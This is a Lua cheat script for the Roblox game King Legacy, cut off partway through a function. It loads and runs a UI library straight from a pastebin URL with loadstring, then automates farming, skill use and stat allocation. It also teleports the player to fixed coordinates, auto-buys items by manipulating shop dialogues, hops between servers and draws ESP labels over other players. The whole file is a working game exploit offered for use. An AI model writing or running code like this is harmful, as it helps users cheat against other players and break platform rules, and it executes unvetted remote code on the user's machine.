if game.PlaceId == 4520749081 or game.PlaceId == 6381829480 then

local DiscordLib = loadstring(game:HttpGet('https://pastebin.com/raw/GrqykwSh'))()
	
	local win = DiscordLib:Window(" Dragon Hub | kinglegacy")
	
	local serv = win:Server("Dragon Buyer", "http://www.roblox.com/asset/?id=7180146815")
	
	local tgls = serv:Channel("Auto Farm")
	
tgls:Toggle("Auto-Farm",false, function(bool)
_G.Enabled = bool
end)

        tgls:Toggle("Haki",false,function(t)
				_G.BusoHaki = t
			end)

			tgls:Toggle("Ken-Haki",false,function(t)
				_G.SemiGod = t
			end)

ModeAutoFarm = 3
local sldr = tgls:Slider("Mode", 1, 3, precise, function(t)
 _G.ModeAutoFarm = t
end)
Distance = 6
local sldr = tgls:Slider("Distance", 0, 10, precise, function(t)
_G.Distance = t
end)
             TOOLS = {}
            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if v:IsA("Tool") then
                    table.insert(TOOLS,v.Name)
                end
            end
    
            local rdropdwon = tgls:Dropdown("SelectWeapon",TOOLS,function(t)
                _G.SelectWeapon = t
            end)
            ---------------------------------------------------------------------------------------------------------
    
            tgls:Button("Refresh Weapon",function()
                rdropdwon:Clear()
                TOOLS = {}
                for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v:IsA("Tool") then
                        rdropdwon:Add(v.Name)
                    end
                end
            end)
    
            
    tgls:Label("Auto Skill")
	
	tgls:Toggle("Z",false,function(t)
	  zzzhee = t
	end)
	tgls:Toggle("X",false,function(t)
	  xxxhee = t
	end)
	tgls:Toggle("C",false,function(t)
	  ccchee = t
	end)
	tgls:Toggle("V",false,function(t)
	  vvvhee = t
	end)
	tgls:Toggle("E",false,function(t)
	  eeehee = t
	end)
	function autoskillheehee()
				if  zzzhee == true then
					game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
					game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
				end
				if  xxxhee == true then
					game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
					game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
				end
				if  ccchee == true then
					game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
					game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
				end
				if  vvvhee == true then
					game:GetService("VirtualInputManager"):SendKeyEvent(true,118,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
					game:GetService("VirtualInputManager"):SendKeyEvent(false,118,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
				end
				if  eeehee == true then
					game:GetService("VirtualInputManager"):SendKeyEvent(true,101,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
					game:GetService("VirtualInputManager"):SendKeyEvent(false,101,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
				end
			end
function Click()
    game:GetService'VirtualUser':CaptureController()
    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
end
            function EquipWeapon(ToolSe)
            if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
            wait(.1)
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
            end
            end
spawn(function()
    while wait(.1) do
        if _G.Enabled then
            EquipWeapon(_G.SelectWeapon)
            Click()
        end
end
end)
	tgls:Seperator()

	   tgls:Toggle("Auto-Eema",false,function(t)
		_G.Enma = t
	end)
		spawn(function()
		while wait() do
			if _G.Enma then
				pcall(function()
				 equip()
				 if game:GetService("Workspace").Monster.Boss:FindFirstChild("King Samurai [Lv. 3500]") or game:GetService("ReplicatedStorage").MOB:FindFirstChild("King Samurai [Lv. 3500]") then
				 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game:GetService("Workspace").Island["A - Japan"]["King Samurai Spawn"].CFrame * CFrame.new(0,10,0)
				 for i,v in pairs(game:GetService("Workspace").Monster.Boss:GetChildren()) do
				 if v.Name == "King Samurai [Lv. 3500]" and v.Humanoid.Health > 0 then
				 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,8,0) * CFrame.Angles(math.rad(-90), 0, 0)
				 	attack()
				 end
				 end				
				 elseif not game:GetService("Workspace").Monster.Boss:FindFirstChild("King Samurai [Lv. 3500]") or not game:GetService("ReplicatedStorage").MOB:FindFirstChild("King Samurai [Lv. 3500]") and not V.Humanoid < 0  then
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
function TPReturner()
local Site;
if foundAnything == "" then
Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
else
Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
end
local ID = ""
if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
foundAnything = Site.nextPageCursor
end
local num = 0;
for i,v in pairs(Site.data) do
local Possible = true
ID = tostring(v.id)
if tonumber(v.maxPlayers) > tonumber(v.playing) then
for _,Existing in pairs(AllIDs) do
  if num ~= 0 then
		if ID == tostring(Existing) then
		   Possible = false
		end
  else
		if tonumber(actualHour) ~= tonumber(Existing) then
		   local delFile = pcall(function()
			  -- delfile("NotSameServers.json")
			  AllIDs = {}
			  table.insert(AllIDs, actualHour)
		   end)
		end
  end
  num = num + 1
end
if Possible == true then
  table.insert(AllIDs, ID)
  wait()
  pcall(function()
		-- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
		wait()
		game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
  end)
  wait(4)
end
end
end
end
function Teleport()
while wait() do
pcall(function()
TPReturner()
if foundAnything ~= "" then
  TPReturner()
end
end)
end
end
Teleport()
end
end)
end
end
end)

local stat = serv:Channel("Auto stat")
	
			_G.set = 1
			stat:Slider("Set Point",0,20,1,function()
				_G.set = 1
			end)
			stat:Toggle("Defense",false,function(t)
				_G.Defense = t
			end)
			stat:Toggle("Melee",false,function(t)
				_G.Melee = t
			end)
			stat:Toggle("Sword",false,function(t)
				_G.Sword = t
			end)
			stat:Toggle("Devil Fruit",false,function(t)
				_G.DevilFruit = t
			end)
	
			spawn(function()
				while game:GetService("RunService").RenderStepped:wait() do
					if _G.Defense then
						pcall(function()
							local args = {
								[1] = "Defense",
								[2] = _G.set
							}
							game:GetService("Players").LocalPlayer.PlayerGui.Stats.Button.StatsFrame.RemoteEvent:FireServer(unpack(args))
						end)
					end
					if _G.Melee then
						pcall(function()
							local args = {
								[1] = "Melee",
								[2] = _G.set
							}
							game:GetService("Players").LocalPlayer.PlayerGui.Stats.Button.StatsFrame.RemoteEvent:FireServer(unpack(args))
						end)
					end
					if _G.Sword then
						pcall(function()
							local args = {
								[1] = "Sword",
								[2] = _G.set
							}
							game:GetService("Players").LocalPlayer.PlayerGui.Stats.Button.StatsFrame.RemoteEvent:FireServer(unpack(args))
						end)
					end
					if _G.DevilFruit then
						pcall(function()
							local args = {
								[1] = "Devil Fruit",
								[2] = _G.set
							}
							game:GetService("Players").LocalPlayer.PlayerGui.Stats.Button.StatsFrame.RemoteEvent:FireServer(unpack(args))
						end)
					end
				end
			end)
			if game.PlaceId == 4520749081 then
			local Shop = serv:Channel("Buy item")
			Shop:Button("Katana $5000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2049.4987792969, 48.143287658691, -1719.1455078125)
			end)
			Shop:Button("Cyborg $1000000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4577.1977539063, 123.65245819092, 3224.4995117188)
			end)
			Shop:Button("DarKLeg $150000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6456.65625, 168.45036315918, -2374.0812988281)
			end)
			Shop:Button("Mini Mace $500000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8698.2412109375, 310.09521484375, 1921.1473388672)
			end)
			Shop:Button("WaterStyle $1500000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2861.1259765625, 40.272518157959, 14145.63671875)
			end)
			Shop:Button("BusoHaki $500000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8133.9077148438, 12.755578994751, 5435.8061523438)
			end)
			Shop:Button("None $10000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-932.88989257813, 386.42059326172, 4755.2895507813)
			end)
			Shop:Button("Pipe $250000",function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8102.755859375, 11.846879959106, 5374.177734375)
			end)
			end
			if game.PlaceId == 4520749081 then
			local TP = serv:Channel("Teleport")
	
				TP:Button("Town",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2222.798828125, 48.217567443848, -1755.4344482422)
				end)
				TP:Button("Pirate Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4018.5754394531, 37.868427276611, 326.14840698242)
				end)
				TP:Button("Soldier Town",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1681.0186767578, 68.619071960449, 1242.8004150391)
				end)
				TP:Button("Shark Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3941.6325683594, 10.566205978394, 3228.8093261719)
				end)
				TP:Button("Chef Ship",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(104.73770904541, 12.964610099792, -145.74780273438)
				end)
				TP:Button("Snow Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2824.9541015625, 18.14605140686, 1410.3936767578)
				end)
				TP:Button("Desert Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1636.9338378906, 13.269888877869, 3480.7963867188)
				end)
				TP:Button("Skyland",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1231.2655029297, 200.67687988281, 4618.2275390625)
				end)
				TP:Button("Bubbleland",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8056.2368164063, 13.389360427856, 5555.2104492188)
				end)
				TP:Button("Lobby Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4252.2373046875, 13.413521766663, 6880.1655273438)
				end)
				TP:Button("Zombie Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-931.52960205078, 48.181209564209, 8328.90234375)
				end)
				TP:Button("War Island",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8581.783203125, 81.803428649902, 1592.5651855469)
				end)
				TP:Button("Fishland",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2933.6862792969, 40.583614349365, 13371.825195313)
				end)
			end
			if game.PlaceId == 6381829480 then
		local TP = serv:Channel("Teleport")
		TP:Button("Dock",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1889.5512695313, 72.357009887695, -2089.6657714844)
		end)
		TP:Button("Hibernus Land",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1398.8989257813, 75.344528198242, -5781.6713867188)
		end)
		TP:Button("Floresco Land",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2254.3591308594, 75.344680786133, -1809.3531494141)
		end)
		TP:Button("Fons Land",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(212.10015869141, 75.344528198242, -4806.1918945313)
		end)
		TP:Button("Carcer Land",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-97.867179870605, 75.344505310059, 238.53981018066)
		end)
		TP:Button("King Samurai",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3617.8469238281, 508.57559204102, -1410.083984375)
		end)
		TP:Button("Torrefacio",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3611.4453125, 75.34969329834, 512.34454345703)
		end)
		TP:Button("Viridans",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2930.3295898438, 74.702262878418, 3004.9523925781)
		end)
		TP:Button("Skull isLand",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3453.7497558594, 51.437110900879, 10329.479492188)
		end)
		TP:Button("Dead Tundra",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8396.2236328125, 14.361581802368, 933.12878417969)
				end)	
		end    
		if game.PlaceId == 6381829480 then
		local Ty = serv:Channel("Buy item")
		Ty:Button("Black Market",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1908.8797607422, 72.357009887695, -2100.9055175781)
		end)
		Ty:Button("Cyborg",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(841.56256103516, 75.294364929199, -4033.5974121094)
		end)
		Ty:Button("Water Style",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(851.13958740234, 75.294364929199, -3968.2131347656)
		end)
		Ty:Button("Dragon Claw",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(246.9157409668, 432.90087890625, -936.02331542969)
		end)
		Ty:Button("DarkLeg",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(790.33093261719, 75.294342041016, -4031.0964355469)
		end)
		Ty:Button("Awake Master",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2067.57421875, 169.78974914551, 5003.4887695313)
		end)
		Ty:Button("Random Appearance",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1338.2873535156, 75.847648620605, -2216.00390625)
		end)
		Ty:Button("Reset Stats",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2277.4682617188, 75.294364929199, -1779.3775634766)
		end)
		Ty:Button("Random Fruit",function()
					game.Players.localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2326.703125, 75.435775756836, -1890.0198974609)
		end)
			end
            if game.PlaceId == 6381829480 then
			local Shop = serv:Channel("Auto Buy item")
			Shop:Toggle("Autobuy WaterStyleShop",false,function(l)
				_G.A = l
				while _G.A do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(848.02002, 75.5489655, -3967.70996, 0, 0, -1, 0, 1, 0, 1, 0, 0)
					wait(.5)
					local A_1 = game:GetService("Workspace").AntiTPNPC.WaterStyleShop
					local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
					Event:InvokeServer(A_1)
					wait(.5)
					if game:GetService("Players").LocalPlayer.PlayerGui.WaterStyleShop.Dialogue.Accept.Visible == true then
						game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
						game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
						wait(.1)
						for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
							if v.Name == "Dialogue" then
								v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
								v.Accept.Position = UDim2.new(-2, 0, -5, 0)
								v.Accept.ImageTransparency = 1
							end
						end
					end
				end
			end)
            Shop:Toggle("Autobuy DragonClaw",false,function(l)
				_G.A = l
				while _G.A do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(246.915741, 432.926941, -936.023315, 1, 0, 0, 0, 1, 0, 0, 0, 1)
					wait(.5)
					local A_1 = game:GetService("Workspace").AntiTPNPC.DragonClawShop
					local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
					Event:InvokeServer(A_1)
					wait(.5)
					if game:GetService("Players").LocalPlayer.PlayerGui.DragonClawShop.Dialogue.Accept.Visible == true then
						game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
						game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
						wait(.1)
						for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
							if v.Name == "Dialogue" then
								v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
								v.Accept.Position = UDim2.new(-2, 0, -5, 0)
								v.Accept.ImageTransparency = 1
							end
						end
					end
				end
		 end)

		 Shop:Toggle("Autobuy ElectroShop",false,function(l)
			_G.A = l
			while _G.A do
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3005.58643, 206.922485, -6514.49609, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				wait(.5)
				local A_1 = game:GetService("Workspace").AntiTPNPC.ElectroShop
				local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
				Event:InvokeServer(A_1)
				wait(.5)
				if game:GetService("Players").LocalPlayer.PlayerGui.ElectroShop.Dialogue.Accept.Visible == true then
					game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
					game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
					wait(.1)
					for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
						if v.Name == "Dialogue" then
							v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
							v.Accept.Position = UDim2.new(-2, 0, -5, 0)
							v.Accept.ImageTransparency = 1
						end
					end
				end
			end
	 end)
     Shop:Toggle("Autobuy DarkLegShop",false,function(l)
		_G.A = l
		while _G.A do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(783.915955, 75.5222702, -4031.6106, 0.999726355, -0, -0.0233916696, 0, 1, -0, 0.0233916696, 0, 0.999726355)
			wait(.5)
			local A_1 = game:GetService("Workspace").AntiTPNPC.DarkLegShop
			local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
			Event:InvokeServer(A_1)
			wait(.5)
			if game:GetService("Players").LocalPlayer.PlayerGui.DarkLegShop.Dialogue.Accept.Visible == true then
				game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
				game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
				wait(.1)
				for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
					if v.Name == "Dialogue" then
						v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
						v.Accept.Position = UDim2.new(-2, 0, -5, 0)
						v.Accept.ImageTransparency = 1
					end
				end
			end
		end
 end)

 Shop:Toggle("Auto ResetStats",false,function(l)
	_G.A = l
	while _G.A do
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2271.6062, 75.4034729, -1778.44934, 0, 0, 1, 0, 1, -0, -1, 0, 0)
		wait(.5)
		local A_1 = game:GetService("Workspace").AntiTPNPC.ResetStatsShop
		local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
		Event:InvokeServer(A_1)
		wait(.5)
		if game:GetService("Players").LocalPlayer.PlayerGui.ResetStatsShop.Dialogue.Accept.Visible == true then
			game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
			game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
			wait(.1)
			for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
				if v.Name == "Dialogue" then
					v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
					v.Accept.Position = UDim2.new(-2, 0, -5, 0)
					v.Accept.ImageTransparency = 1
				end
			end
		end
	end
end)
Shop:Toggle("Auto RandomFruit (Beli)",false,function(l)
	_G.A = l
	while _G.A do
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.65552, 48.536602, -1731.71289, -0.612905264, 0.000424007536, 0.790156245, 0.000196148452, 0.999999881, -0.000384464569, -0.790156364, -8.06524477e-05, -0.612905383)
		wait(.5)
		game:GetService'VirtualUser':CaptureController()
		game:GetService'VirtualUser':Button1Down(Vector2.new(2540, 242))
		wait(.1)
		game:GetService("Players").LocalPlayer.PlayerGui.ARandomFruit.Dialogue.Beli.Size = UDim2.new(15,0,15,0)
		game:GetService("Players").LocalPlayer.PlayerGui.ARandomFruit.Dialogue.Beli.Position = UDim2.new(-5,0,-5,0)
		wait(.2)
		game:GetService'VirtualUser':Button1Up(Vector2.new(0,0))
		game:GetService'VirtualUser':Button1Down(Vector2.new(0,0))
end
end)
end

if game.PlaceId == 4520749081 then
    local Shop = serv:Channel("Auto Buy item")
    Shop:Toggle("Auto RandomFruit (Beli)",false,function(l)
        _G.A = l
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2327.0249, 75.8251343, -1896.1084, -0.999978423, 0.000173775712, 0.00656040758, 0.000171510474, 0.99999994, -0.000345852488, -0.00656046718, -0.000344719883, -0.999978304)
            wait(.5)
            game:GetService'VirtualUser':CaptureController()
            game:GetService'VirtualUser':Button1Down(Vector2.new(2540, 242))
            wait(.1)
            game:GetService("Players").LocalPlayer.PlayerGui.ARandomFruit.Dialogue.Beli.Size = UDim2.new(15,0,15,0)
            game:GetService("Players").LocalPlayer.PlayerGui.ARandomFruit.Dialogue.Beli.Position = UDim2.new(-5,0,-5,0)
            wait(.2)
            game:GetService'VirtualUser':Button1Up(Vector2.new(0,0))
            game:GetService'VirtualUser':Button1Down(Vector2.new(0,0))
    end
    end)

    Shop:Toggle("AutobuySoru",false,function(value)
        _G.A = value
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1643.52405, 40.609642, 1174.27527, 0.999996722, -1.18106527e-07, -0.00255417218, 1.18293485e-07, 1, 7.30455838e-08, 0.00255417218, -7.33474863e-08, 0.999996722)
            wait(.5)
            local A_1 = game:GetService("Workspace").AntiTPNPC.SoruShop
            local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
            Event:InvokeServer(A_1)
            if game:GetService("Players").LocalPlayer.PlayerGui.SoruShop.Dialogue.Accept.Visible == true then
                game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
                game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
                wait(.1)
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if v.Name == "Dialogue" then
                        v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
                        v.Accept.Position = UDim2.new(-2, 0, -5, 0)
                        v.Accept.ImageTransparency = 1
                    end
                end
            end
        end
    end)
    
    
    Shop:Toggle("AutoBuy None",false,function(value)
        _G.A = value
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-930.697998, 386.523773, 4759.78369, 0.898790359, 0, 0.438378751, 0, 1, 0, -0.438378751, 0, 0.898790359)
            wait(.5)
            local A_1 = game:GetService("Workspace").AntiTPNPC.ShopRemoveFruit
            local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
            Event:InvokeServer(A_1)
            if game:GetService("Players").LocalPlayer.PlayerGui.ShopRemoveFruit.Dialogue.Accept.Visible == true then
                game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
                game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
                wait(.1)
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if v.Name == "Dialogue" then
                        v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
                        v.Accept.Position = UDim2.new(-2, 0, -5, 0)
                        v.Accept.ImageTransparency = 1
                    end
                end
            end
        end
    end)
    
    Shop:Toggle("AutoBuy WaterStyle",false,function(value)
        _G.A = value
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-930.697998, 386.523773, 4759.78369, 0.898790359, 0, 0.438378751, 0, 1, 0, -0.438378751, 0, 0.898790359)
            wait(.5)
            local A_1 = game:GetService("Workspace").AntiTPNPC.WaterStyleShop
            local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
            Event:InvokeServer(A_1)
            if game:GetService("Players").LocalPlayer.PlayerGui.WaterStyleShop.Dialogue.Accept.Visible == true then
                game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
                game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
                wait(.1)
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if v.Name == "Dialogue" then
                        v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
                        v.Accept.Position = UDim2.new(-2, 0, -5, 0)
                        v.Accept.ImageTransparency = 1
                    end
                end
            end
        end
    end)
    
    Shop:Toggle("AutoBuy Mini Mace",false,function(value)
        _G.A = value
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8702.14746, 310.193512, 1925.78662, 0.86898458, 0, 0.494839221, 0, 1, 0, -0.494839221, 0, 0.86898458)
            wait(.5)
            game:GetService'VirtualUser':CaptureController()
            game:GetService'VirtualUser':Button1Down(Vector2.new(2540, 242))
            wait(.1)
            game:GetService("Players").LocalPlayer.PlayerGui.SwordShop.Dialogue.Accept.Size = UDim2.new(15,0,15,0)
            game:GetService("Players").LocalPlayer.PlayerGui.SwordShop.Dialogue.Accept.Position = UDim2.new(-5,0,-5,0)
            wait(.2)
            game:GetService'VirtualUser':Button1Up(Vector2.new(0,0))
            game:GetService'VirtualUser':Button1Down(Vector2.new(0,0))
        end
    end)

    Shop:Toggle("AutoBuy DarkLeg",false,function(value)
        _G.A = value
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6452.85352, 168.681778, -2371.36523, 0.552294254, -0, -0.833649278, 0, 1, -0, 0.833649278, 0, 0.552294254)
            wait(.5)
            local A_1 = game:GetService("Workspace").AntiTPNPC.DarkLegShop
            local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
            Event:InvokeServer(A_1)
            if game:GetService("Players").LocalPlayer.PlayerGui.DarkLegShop.Dialogue.Accept.Visible == true then
                game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
                game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
                wait(.1)
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if v.Name == "Dialogue" then
                        v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
                        v.Accept.Position = UDim2.new(-2, 0, -5, 0)
                        v.Accept.ImageTransparency = 1
                    end
                end
            end
        end
    end)

    Shop:Toggle("AutoBuy Cyborg",false,function(value)
        _G.A = value
        while _G.A do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4578.58057, 123.202278, 3223.21167, -0.479026794, 0, -0.877800286, 0, 1, 0, 0.877800286, 0, -0.479026794)
            wait(.5)
            local A_1 = game:GetService("Workspace").AntiTPNPC.CyborgShop
            local Event = game:GetService("ReplicatedStorage").Remotes.Functions.CheckQuest
            Event:InvokeServer(A_1)
            if game:GetService("Players").LocalPlayer.PlayerGui.CyborgShop.Dialogue.Accept.Visible == true then
                game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
                game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))
                wait(.1)
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if v.Name == "Dialogue" then
                        v.Accept.Size = UDim2.new(0, 10000, 0, 10000)
                        v.Accept.Position = UDim2.new(-2, 0, -5, 0)
                        v.Accept.ImageTransparency = 1
                    end
                end
            end
        end
    end)
    end
local PY = serv:Channel("Player")
			function isnil(thing)
				return (thing == nil)
			end
			local function round(n)
				return math.floor(tonumber(n) + 0.5)
			end
			Number = math.random(1, 1000000)
			function UpdatePlayerChaMonster()
				for i,v in pairs(game:GetService'Players':GetChildren()) do
					pcall(function()
						if not isnil(v.Character) then
							if ESPPlayer then
								if not isnil(v.Character.Head) and not v.Character.Head:FindFirstChild('NameEsp'..Number) then
									local bill = Instance.new('BillboardGui',v.Character.Head)
									bill.Name = 'NameEsp'..Number
									bill.ExtentsOffset = Vector3.new(0, 1, 0)
									bill.Size = UDim2.new(1,200,1,30)
									bill.Adornee = v.Character.Head
									bill.AlwaysOnTop = true
									local name = Instance.new('TextLabel',bill)
									name.Font = "GothamBold"
									name.FontSize = "Size14"
									name.TextWrapped = true
									name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' M')
									name.Size = UDim2.new(1,0,1,0)
									name.TextYAlignment = 'Top'
									name.BackgroundTransparency = 1
									name.TextStrokeTransparency = 0.5
									if v.Team == game.Players.LocalPlayer.Team then
										name.TextColor3 = Color3.new(255,0,0)
									else
										name.TextColor3 = Color3.new(0,0,255)
									end
								else
									v.Character.Head['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' M')
								end
							else
								if v.Character.Head:FindFirstChild('NameEsp'..Number) then
									v.Character.Head:FindFirstChild('NameEsp'..Number):Destroy()
								end
							end
						end
					end)
				end
			end
			function UpdateDevilChaMonster() 
				for i,v in pairs(game.Workspace:GetChildren()) do
					pcall(function()
						if DevilFruitESP then
